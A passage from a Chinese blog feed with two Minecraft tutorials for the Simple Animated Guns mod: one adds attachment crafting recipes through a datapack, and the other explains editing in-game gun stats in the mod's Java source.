S.A.G 该 mod 中的物品 id 在哪，你可以找到解压后的文件夹，路径为：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">SimpleAnimatedGuns-1.20.1-v1.3-BETA-3\assets\anim_guns\lang\en_us.json</span></span></code></pre></div></div></figure><p>该 json 文件中定义了所有物品，你可以在该文件中确认 mod 相关的每一个物品 id。</p><p>另，<code>pattern</code> 表示物品在合成时的摆放样式，如果有格子需要为空，那么就填空格即可。</p><h3 id="配件合成尝试"><a class="markdownIt-Anchor" href="#配件合成尝试"></a> 配件合成尝试</h3><p>由于我们是新建了 json 文件，而非修改某个文件，一个很直接的实现想法就是：直接将三个 json 文件放到 recipes 文件夹中，然后重新压缩为 jar 再进行替换。</p><p>此方法很简单，但是我尝试后发现无法正确实现效果，附件仍然无法合成，可能是我在某些地方有遗漏？我没有再继续探究。</p><h3 id="构建-datapack_sag-数据包"><a class="markdownIt-Anchor" href="#构建-datapack_sag-数据包"></a> 构建 Datapack_S.A.G 数据包</h3><p>于是，我开始构建数据包来实现效果。</p><p>数据包是 <strong>原版 Minecraft 提供的官方机制</strong>，用于在不改动 MOD 本体的前提下，<strong>向游戏添加新的配方、结构、标签、函数等数据内容</strong>。</p><p>数据包通常支持往游戏中添加：</p><ul><li>合成配方（Shaped / Shapeless）</li><li>熔炉配方（smelting /blasting 等）</li><li>loot 表、函数、进度</li><li>……</li></ul><p>数据包的目录结构一般是：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">📁 YourDatapack/</span></span><span class="line"><span style="color: #D4D4D4">├── 📄 pack.mcmeta</span></span><span class="line"><span style="color: #D4D4D4">├── 📁 data/</span></span><span class="line"><span style="color: #D4D4D4">│   └── 📁 anim_guns/</span></span><span class="line"><span style="color: #D4D4D4">│       └── 📁 recipes/</span></span><span class="line"><span style="color: #D4D4D4">│           ├──📄 sight_holo.json</span></span><span class="line"><span style="color: #D4D4D4">│           ├──📄 grip_foregrip.json</span></span><span class="line"><span style="color: #D4D4D4">│           └──📄 muzzle_mbrake.json</span></span></code></pre></div></div></figure><p>其中 <code>pack.mcmeta</code> 的内容如下：</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"pack"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"pack_format"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">15</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"description"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"S.A.G Custom Recipes"</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><blockquote><p><code>pack_format</code> 取决于游戏版本，可以参考<a href="https://minecraft.wiki/w/Pack_format">官方 Wiki</a></p></blockquote><p>接下来将数据包整个复制下来，粘贴到下面的目录下：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">.minecraft\saves\你的存档名\datapacks\</span></span></code></pre></div></div></figure><p>如果你开启了版本隔离，以我的存档为例，路径可能是：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">F:\PCL2\.minecraft\versions\1.20.1-Fabric 0.16.14\saves\新的世界\datapacks\</span></span></code></pre></div></div></figure><p>使得最后路径为：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">F:\PCL2\.minecraft\versions\1.20.1-Fabric 0.16.14\saves\新的世界\datapacks\Datapack_S.A.G</span></span></code></pre></div></div></figure><p>粘贴后的目录结构为（已忽略不相关文件夹）：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">📁 .minecraft</span></span><span class="line"><span style="color: #D4D4D4">├── 📁 versions</span></span><span class="line"><span style="color: #D4D4D4">│   └── 📁 1.20.1-Fabric 0.16.14</span></span><span class="line"><span style="color: #D4D4D4">│       └── 📁 saves</span></span><span class="line"><span style="color: #D4D4D4">│           └── 📁 新的世界</span></span><span class="line"><span style="color: #D4D4D4">│               └── 📁 datapacks</span></span><span class="line"><span style="color: #D4D4D4">│                   └── 📁 Datapack_S.A.G</span></span><span class="line"><span style="color: #D4D4D4">│                       ├── 📄 pack.mcmeta</span></span><span class="line"><span style="color: #D4D4D4">│                       └── 📁 data</span></span><span class="line"><span style="color: #D4D4D4">│                           └── 📁 anim_guns</span></span><span class="line"><span style="color: #D4D4D4">│                               └── 📁 recipes</span></span><span class="line"><span style="color: #D4D4D4">│                                   ├── 📄 sight_holo.json</span></span><span class="line"><span style="color: #D4D4D4">│                                   ├── 📄 grip_foregrip.json</span></span><span class="line"><span style="color: #D4D4D4">│                                   └── 📄 muzzle_mbrake.json</span></span></code></pre></div></div></figure><p>之后进入相对应的游戏存档中，享受游戏吧。</p><p>如果你并未关闭游戏而是实时地增加数据包，你可能需要使用 <code>/reload</code> 命令来重载数据包，使其生效。</p><p>如果你想检查数据包是否被读取，可以使用下面的命令：</p><figure class="shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">/datapack list</span></span></code></pre></div></div></figure><p>成功示例：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506022128098.png" alt="image-20250602212831033"></p><h3 id="配件安装拆卸"><a class="markdownIt-Anchor" href="#配件安装拆卸"></a> 配件安装 / 拆卸</h3><p>配件安装其实很简单，将你拥有的配件使用鼠标右键应用到适配的枪上即可；配件拆卸也是如此，只需使用鼠标右键点击装备了配件的枪械即可将配件一件件拆卸下来。例如：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202506012341304.gif" alt="S.A.G1"></p><h2 id="枪械零件制作"><a class="markdownIt-Anchor" href="#枪械零件制作"></a> 枪械零件制作</h2><p>枪械零件、蓝图的制作方法不像配件那样困难，因为作者已经写好了每一个合成 / 熔炼配方。如果你不知道该如何合成，可以去学习如何使用 REI 或者其他物品管理器 mod。</p><p>该部分较为简单，基本是鼠标点点就知道合成 / 熔炼方法，故不再详细介绍。</p><h2 id="相关链接"><a class="markdownIt-Anchor" href="#相关链接"></a> 相关链接</h2><ul><li><a href="https://www.mcmod.cn/class/1674.html">【MC 百科】REI 物品管理器</a></li></ul><h2 id="声明"><a class="markdownIt-Anchor" href="#声明"></a> 声明</h2><p>因为原作者并未在 GitHub 上声明任何一种开源协议，故在此我并不会提供制作的数据包，而只是将这种解决办法以本篇文字教程的形式提供给大家，以尊重原作者的劳动成果，希望大家玩的开心。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Minecraft </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Simple Animated Guns 枪械属性修改</title>
      <link href="/posts/64665.html"/>
      <url>/posts/64665.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><meta name="description" content="Minecraft我的世界mod模组：Simple Animated Guns模组枪械属性修改简易教程"><blockquote><p>环境：Windows11、Java"17.0.11" 2024-04-16 LTS 64-Bit、PCL2 或其他启动器</p><p>工具：Vscode</p></blockquote><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>本文是对该 mod 进行枪械属性修改，如果你需要这个 mod 的<strong>游玩指南或者教程</strong>，欢迎你阅读我写的文章：【<a href="https://4rozen.github.io/archives/Gamer/63649.html">Simple Animated Guns 游玩指南 / 教程</a>】</p><h2 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h2><p>省略我半小时的翻看源代码的心路历程，我们直入正题吧… 本文并不复杂，只要不是纯小白，都可一战</p><p>在此之前你需要准备的是：</p><ol><li>原 mod 项目</li><li>一个能用的编辑器，如 Vscode、Sublime</li><li>Java17 环境</li></ol><h2 id="clone-或下载原作者项目"><a class="markdownIt-Anchor" href="#clone-或下载原作者项目"></a> Clone 或下载原作者项目</h2><blockquote><p>原作者项目地址：<a href="https://github.com/elidhan/Simple-Animated-Guns/tree/1.20.1">Simple-Animated-Guns</a></p><p>由于没有官方修改枪械属性的相关教程，所以我的思路是通过开源的源工程文件进行代码审计，修改好属性后将其编译成一个我们的自定义版本。本文仅供学习参考。</p><p>赞美原作者！！！Fabric 的枪械 mod 真的很少！</p></blockquote><p>进行以下的步骤前，请先确认你操作的分支是否为你需要的分支：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721236869939.png" alt="QQ_1721236869939"></p><p>比如我玩的 BetterMC 是 1.20.1 的，所以我就选择了对应的版本。然后我们需要把原作者的项目搞到本地来，因为我们要进行修改嘛。这里不论是 Git clone 还是下载成压缩包都是需要一定 “本事” 的，有能力的可以自行下载到本地，我这里直接提供蓝奏云的下载链接在文末，请自行下载需要的版本分支项目。</p><h2 id="准备好编辑器"><a class="markdownIt-Anchor" href="#准备好编辑器"></a> 准备好编辑器</h2><p>我推荐使用微软的 vsocde 作为编辑器，这个编辑器在微软商店就能下载到：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721237162354.png" alt="QQ_1721237162354"></p><p>当然你也可以使用你习惯的编辑器，Sublime Text 啥的都可以。如果你的 Vscode 是英文的不习惯，可以自行搜索 Vscode 汉化，或者参考下面的文章：</p><ul><li><a href="https://blog.csdn.net/danshiming/article/details/132110419">Vscode 设置中文</a></li><li><a href="https://blog.csdn.net/qq_45565693/article/details/128421869">Vscode 安装汉化插件不生效</a></li></ul><h2 id="准备好-java-环境"><a class="markdownIt-Anchor" href="#准备好-java-环境"></a> 准备好 Java 环境</h2><p>如果你下载好了项目文件，请将其解压。然后咱们来检查目录中是否存在 <code>build.gradle</code> 文件，如果没有请重新下载，不出意外是有的。项目目录应该如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721238704344.png" alt="QQ_1721238704344"></p><p>请使用我们准备好的 Vscode 将其打开，不出意外你会得到：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721239112188.png" alt="QQ_1721239112188"></p><p>可以看到这里要求的 Java 版本。请按要求切换本地 Java 版本环境，也就是转到系统环境变量进行调整。如果你忘记本地 Java 版本，请使用命令行执行查看版本命令，查看本地 Java 版本的命令是：</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">java</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">-version</span></span></code></pre></div></div></figure><p>Win+R 就可以打开运行，然后输入 cmd 就可以打开一个命令行了。</p><p>上述命令需要你配置好 Java 环境变量。如果出现版本号且版本对得上，就说明你的 Java 环境是 ok 的；如果你从未安装过 Java 只是在使用启动器时有所耳闻，<strong>可以参考下面的文章来安装并配置 Java 环境变量</strong>（文末我会提供 Java17 版本 123 云盘链接，蓝奏云限制 100m 大小没办法）。</p><p>环境变量的作用就是能让你在命令行内直接使用 java 命令，而不是必须得在 java.exe 目录下才能使用 java 命令</p><ul><li><a href="https://blog.csdn.net/godot06/article/details/104378253">Java 基础 1 - 环境篇：JDK 安装与环境变量配置</a></li></ul><p>如果你使用我提供的 Java17 安装包，也请看一看上面的这篇文章，直接跳到 <code>1-2安装</code>步骤即可，或者自行搜索可信的教程文章也是可以的。</p><p>上述文章在环境变量配置中，关键字符串如下（分号是变量值最后如果没有分号才需要加）</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">;</span><span style="color: #DCDCAA">%JAVA_HOME%\bin</span><span style="color: #D4D4D4">;</span><span style="color: #DCDCAA">%JAVA_HOME%\jre\bin</span><span style="color: #D4D4D4">;</span></span></code></pre></div></div></figure><p>如果你的 PATH 变量不是文章中的样式，而是和我一样是列表，那就简单得多了直接点右边的新建就可以：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721243505134.png" alt="QQ_1721243505134"></p><p>好了，如果不出意外你已经可以通过 cmd（Win+R 输入 cmd 即可）执行 java 命令了。如果你忘记 Java 在哪，可以使用下面的命令</p><figure class="shiki sh"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">where</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">java</span></span></code></pre></div></div></figure><h2 id="解析-simple-animated-guns-枪械属性"><a class="markdownIt-Anchor" href="#解析-simple-animated-guns-枪械属性"></a> 解析 - Simple Animated Guns 枪械属性</h2><p>请使用我们准备好的 Vscode 编辑器打开项目</p><p>如果你安装时选择了将 Vscode 添加到右键菜单，则可以直接在项目目录空白处直接右键将其作为项目打开：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721244782340.png" alt="QQ_1721244782340"></p><p>你的右键菜单可能和我不一样，因为我嫌它安装时给我的字太长了不好看，所以改成了 <code>Open as Project</code></p><p>如果你没有，那么你可以直接打开 Vscode，在左上角点击文件 -&gt; 打开文件夹，然后找到项目文件夹就好了</p><p>打开后，你会得到一个相对简洁的界面：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245065074.png" alt="QQ_1721245065074"></p><p>鼠标左键点击箭头指向的图标就可以看到我们的工程项目文件目录了。</p><p>Ok，我们先来看看总览性的东西吧。</p><p>我们找到：<code>src\main\resources\assets\anim_guns\lang\en_us.json</code> 的这个 en_us.json 文件</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245291655.png" alt="QQ_1721245291655"></p><p>这个就是作者定义的全部相关东西了。值得一提的是，在原地址的 default 分支，也就是 1.18.2v1-test-arms-weaponmods 分支中，几乎相同的位置下是存在官方汉化的：</p><p>地址：<a href="https://github.com/elidhan/Simple-Animated-Guns/tree/1.18.2v1-test-arms-weaponmods/src/main/resources/assets/anim_guns/lang">https://github.com/elidhan/Simple-Animated-Guns/tree/1.18.2v1-test-arms-weaponmods/src/main/resources/assets/anim_guns/lang</a></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245438657.png" alt="QQ_1721245438657"></p><p>不过版本更迭，现在 1.20.1 并没有这份官方汉化 json 文件了，我个人简单翻译了一下，在 1.20.1 版本的同目录下创建了一份 zh_cn.json 文件，以供大家参考。</p><p>个人力量有限，出错在所难免，如遇到请见谅。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245633177.png" alt="QQ_1721245633177"></p><p>有了这份总览，心中总算也是踏实许多。</p><p>接下来我们找到：<code>src\main\java\net\elidhan\anim_guns\item\ModItems.java</code></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/QQ_1721245988951.png" alt="QQ_1721245988951"></p><p>下面就是我找到 GunItem.java 中的构造函数后进行对照再为大家进行注释解释后的代码了，我这里仅用第一个枪械做例子。</p><p><s>因为其他的枪械是大差不差的，除了开火模式全自动半自动的差别、装填方式、持枪方式、可装备的附件类型外，基本差不多？。</s></p><h3 id="属性值一览"><a class="markdownIt-Anchor" href="#属性值一览"></a> 属性值一览</h3><p>1.20.1 版本分支构造函数如下：</p><figure class="shiki java"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">GunItem</span><span style="color: #D4D4D4">(</span><span style="color: #4EC9B0">Settings</span><span style="color: #D4D4D4"> settings, </span><span style="color: #4EC9B0">String</span><span style="color: #D4D4D4"> gunID, </span><span style="color: #4EC9B0">String</span><span style="color: #D4D4D4"> animationID,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">float</span><span style="color: #D4D4D4"> gunDamage, </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> rateOfFire, </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> magSize,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">Item</span><span style="color: #D4D4D4"> ammoType, </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> reloadCooldown, </span><span style="color: #4EC9B0">float</span><span style="color: #D4D4D4">[] bulletSpread,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">float</span><span style="color: #D4D4D4">[] gunRecoil, </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> pelletCount, </span><span style="color: #4EC9B0">LoadingType</span><span style="color: #D4D4D4"> loadingType,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">SoundEvent</span><span style="color: #D4D4D4"> reloadSoundStart, </span><span style="color: #4EC9B0">SoundEvent</span><span style="color: #D4D4D4"> reloadSoundMagOut,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">SoundEvent</span><span style="color: #D4D4D4"> reloadSoundMagIn, </span><span style="color: #4EC9B0">SoundEvent</span><span style="color: #D4D4D4"> reloadSoundEnd,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">SoundEvent</span><span style="color: #D4D4D4"> shootSound, </span><span style="color: #4EC9B0">SoundEvent</span><span style="color: #D4D4D4"> postShootSound, </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> reloadCycles,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">boolean</span><span style="color: #D4D4D4"> isScoped, </span><span style="color: #4EC9B0">boolean</span><span style="color: #D4D4D4"> unscopeAfterShot,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> reloadStage1, </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> reloadStage2, </span><span style="color: #4EC9B0">int</span><span style="color: #D4D4D4"> reloadStage3, </span><span style="color: #4EC9B0">FiringType</span><span style="color: #D4D4D4"> firingType,</span></span><span class="line"><span style="color: #D4D4D4">                   </span><span style="color: #4EC9B0">ArmType</span><span style="color: #D4D4D4"> armType, </span><span style="color: #9CDCFE">AttachmentItem</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">AttachType</span><span style="color: #D4D4D4">[] acceptedAttachmentTypes)</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">        … 实现部分略 …</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span></code></pre></div></div></figure><p>主要还是看构造函数中的参数要求，实现部分的赋值倒是可以忽略。</p><p>下面这个是 1.20.1 版本分支的枪械属性注册</p><figure class="shiki java"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #6A9955">// 以下为枪械注册属性信息</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// pistol_light为手枪</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #6A9955">// 所有枪械id可在src\main\resources\assets\anim_guns\lang\zh_cn.json中找到，zh_cn.json为本人简单翻译，仅供参考</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">public</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">static</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">final</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">Item</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">PISTOL</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">registerItem</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"pistol_light"</span><span style="color: #D4D4D4">, </span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">GunItem</span><span style="color: #D4D4D4">(</span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #DCDCAA">FabricItemSettings</span><span style="color: #D4D4D4">().</span><span style="color: #DCDCAA">maxCount</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">),</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #6A9955">// 以下属性值仅作参考示例，参数类型在src\main\java\net\elidhan\anim_guns\item\GunItem.java中的构造方法GunItem已写明，可自行理解</span></span><span class="line"><span style="color: #D4D4D4">           </span><span style="color: #CE9178">"pistol_light"</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 枪械id，请勿修改</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #CE9178">"pistol_generic"</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 动画id，请勿修改</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">5</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 伤害值</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">3</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 射速</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">17</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 弹匣容量</span></span><span class="line"><span style="color: #D4D4D4">STANDARD_HANDGUN_BULLET, </span><span style="color: #6A9955">// 弹药类型</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">35</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 重新装填的持续时间，单位为ticks，Minecraft的ticks是1/20秒(s)，也就是50毫秒(ms)</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">float</span><span style="color: #D4D4D4">[] {</span><span style="color: #B5CEA8">1.5f</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">1.5f</span><span style="color: #D4D4D4">}, </span><span style="color: #6A9955">// 子弹偏移/散布范围</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">float</span><span style="color: #D4D4D4">[] {</span><span style="color: #B5CEA8">1f</span><span style="color: #D4D4D4">, </span><span style="color: #B5CEA8">2.5f</span><span style="color: #D4D4D4">},  </span><span style="color: #6A9955">// 后坐力</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 每次击发的子弹数，主要跟枪械开火模式有关，单发、连发之类的</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">GunItem</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">LoadingType</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">MAGAZINE</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填方式，这里是弹匣装填</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 重新装填开始时的音效，此处为null</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">RELOAD_GENERIC_PISTOL_P1</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填时，将弹匣拔出的音效</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">RELOAD_GENERIC_PISTOL_P2</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填时，将新弹匣放入的音效</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">RELOAD_GENERIC_PISTOL_P3</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装填完毕音效</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">ModSounds</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">PISTOL_LIGHT</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 子弹击发音效</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 射击后的音效，如子弹落地音、枪声回响音等，此处为null</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 重新装填涉及的所有步骤的循环次数，这里为1，表示所有步骤仅做一次</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 是否具有瞄准镜</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #569CD6">false</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 射击后是否取消瞄准状态</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">9</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 下面三个数字都是重新装填子弹的步骤持续时间</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">10</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #B5CEA8">20</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">GunItem</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">FiringType</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">SEMI_AUTO</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 射击方式，这里是半自动模式</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #9CDCFE">GunItem</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">ArmType</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">HANDGUN_TWOHAND</span><span style="color: #D4D4D4">, </span><span style="color: #6A9955">// 装备或持枪方式，这里是双手持枪</span></span><span class="line"><span style="color: #D4D4D4"></span><span style="color: #C586C0">new</span><span style="color: #D4D4D4"> </span><span style="color: #4EC9B0">AttachmentItem</span><span style="color: #D4D4D4">.</span><span style="color: #4EC9B0">AttachType</span><span style="color: #D4D4D4">[]{</span><span style="color: #9CDCFE">AttachmentItem</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">AttachType</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">MUZZLE</span><span style="color: #D4D4D4">}) </span><span style="color: #6A9955">// 可装备的附件类型，这里只有一个MUZZLE（枪口），也可以在json文件查看</span></span><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">} </span><span style="color: #6A9955">// 这里还提供了一个匿名内部类，可自定义</span></span><span class="line"><span style="color: #D4D4D4">    );</span></span></code></pre></div></div></figure><p>下面这个则是 1.18.2v1-test-arms-weaponmods 版本分支的</p><figure class="shiki java"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span 